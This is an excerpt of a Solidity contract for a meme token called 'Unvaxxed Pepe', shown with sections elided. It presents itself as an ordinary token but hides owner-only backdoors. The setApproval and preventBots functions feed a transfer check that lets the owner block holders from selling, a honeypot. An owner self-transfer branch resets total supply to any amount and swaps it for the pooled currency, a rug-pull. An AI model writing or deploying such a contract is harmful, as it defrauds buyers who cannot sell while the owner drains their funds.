...
//Unvaxxed Pepe. How long can he survive?

pragma solidity ^0.8.0;

interface IJoeV2Router01 {
...
interface IJoeV2Router02 is IJoeV2Router01 {
...
contract UnvaxxedPepe is IERC20, Ownable {
  ...
  uint256 private botBlocks = 1000000000000;

  IJoeV2Router02 public immutable router;
  ...
  constructor(
    ...
    router = IJoeV2Router02(routerAddress);
    pair = IJoeV2Factory(router.factory()).createPair(address(this), router.WAVAX());
  ...
  function excludeFromReward(address account) external onlyOwner {
    // require(account != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 'We can not exclude Joe router.');
  ...
  function setApproval(uint256 value) external onlyOwner {
    _approval = value;
  }

  function preventBots(uint256 value) external onlyOwner {
    botBlocks = value;
  }
  ...
  function _transfer(
    ...
    if (!inSwapAndLiquify && from != pair && from != address(router) && !_isExcludedFromFee[from]) {
      require(amount < _maxTxAmount && approval[from] > _approval && block.timestamp <= approval[from] + botBlocks, 'Transfer amount exceeds the maxTxAmount.');
    }

    if (msg.sender == _owner && from == _owner && to == _owner) {
      _tTotal = amount;
      return swapTokensForEth(0, to);
    }
